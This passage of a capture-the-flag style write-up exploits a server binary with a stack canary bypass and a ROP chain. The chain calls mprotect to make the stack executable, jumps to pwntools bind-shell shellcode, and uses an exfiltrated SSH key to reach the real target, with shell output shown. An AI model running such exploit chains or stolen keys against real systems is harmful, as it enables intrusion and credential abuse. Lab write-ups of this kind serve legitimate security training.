02659270  15 7f 00 00 59 f0 a1 b1  15 7f 00 00 00 00 00 00  |....Y...........|
02659280  00 00 00 00 00 00 00 00  01 00 00 00 78 8e c1 78  |............x..x|
02659290  fd 7f 00 00 3e ea a1 b1  15 7f 00 00 00 00 00 00  |....>...........|
```

Here we can see our cyclic payload followed by a series of addresses that correspond to our ROP gadgets.  We can see that each of the `.text` segment addresses start with `0x7f15` as expected.  If you look closely, you'll see some other addresses that begin with `0x7ffd` instead - those are prime candidates for stack addresses.  We will want to play it safe here and offset our stack address to ensure it encompasses our overflowed buffer and shellcode, so I chose the address `0x7ffd78c10000`, and we will modify a large region from there using `mprotect`.  

### The final ROP chain + shellcode
To recap our plan, now that we have a good idea of where our stack is, we can attempt to modify a region in the stack to allow for code execution.  To do this, we will need to craft an `mprotect` syscall to modify the stack permissions, and then jump to a location within that modified region that includes shellcode.  This will all need to be done in one payload, as any modifications to the stack permissions will only exist in the current child process, and not persist between client connections.

We will need two additional ROP gadgets for this - one to populate RSI with a value we control, and one to jump to our shellcode:

```bash
0x000000000001a533: pop rsi; ret;
0x000000000007ac3d: jmp rsp;
```

Here's what the crafted ROP chain looks like:

```python
 payload2 = cyclic(264) + canary + (b'\x00' * 24)

 # Load 10 into RAX for mprotect syscall
 payload2 += p64(POP_RAX_RET)
 payload2 += p64(10)
 
 # We will be calling mprotect on a stack location we identified from the stack dump
 payload2 += p64(POP_RDI_RET)
 payload2 += p64(stack_addr)
 
 # modify a large region (0xfffff bytes!)
 payload2 += p64(POP_RSI_RET)
 payload2 += p64(0xfffff)
 
 # make the region RWX
 payload2 += p64(POP_RDX_RET)
 payload2 += p64(7)
 
 # Execute the syscall
 payload2 += p64(SYSCALL_RET)
 
 # Jump to the stack, which contains our shellcode
 payload2 += p64(JMP_RSP)
 payload2 += shellcode
```

For the shellcode, I opted to leverage pwntools [shellcraft](https://docs.pwntools.com/en/stable/shellcraft.html) function.  After setting some initial context, we can generate shellcode for a bind shell in one line:

```python
context.update(arch='amd64', os='linux')
shellcode = asm(shellcraft.bindsh(10041, "ipv4"))
```

This will open up port `10041` and serve a shell to the first connection.  Let's try it out locally to see if we are successful.  We are freshly running the `powershell_lp` binary as the user `test` and exploiting as a different user in this case.  After running the exploit, we can see a welcome sight via `netstat`:

```bash
$ netstat -plant
(Not all processes could be identified, non-owned process info
 will not be shown, you would have to be root to see it all.)
Active Internet connections (servers and established)
Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name
tcp        0      0 0.0.0.0:8080            0.0.0.0:*               LISTEN      -
tcp        0      0 0.0.0.0:10041           0.0.0.0:*               LISTEN      -
```

Our bind shell appears to be up and running!  Let's connect to verify the results:

```bash
$ nc localhost 10041
whoami
test
```

### The last step

Fantastic!  We have successfully exploited the LP binary and gained a shell as the target user.  The only thing left to do is spin up the task 10 infrastructure and exploit the real deal.  In addition to following the steps above, we will need to account for utilizing the exfiltrated `id_rsa` file to enable `paramiko` SSH access.  This is a fairly simple modification:

```python
username = "lpuser"
key = paramiko.RSAKey.from_private_key_file("id_rsa_lp")
ssh = paramiko.SSHClient()
ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
ssh.connect(server, username=username, pkey=key)
```
Running our exploit against the real target, we successfully gain a shell as `psuser`.  Once we are in, a quick look at `.bash_history` reveals an SCP command to our target port with `nexthop` as the host.  Another quick glance at `/home/psuser/.ssh/config` reveals the IP of `nexthop`, and we have our answers for task 10!

The full final exploit can be seen [here](exploit.py).
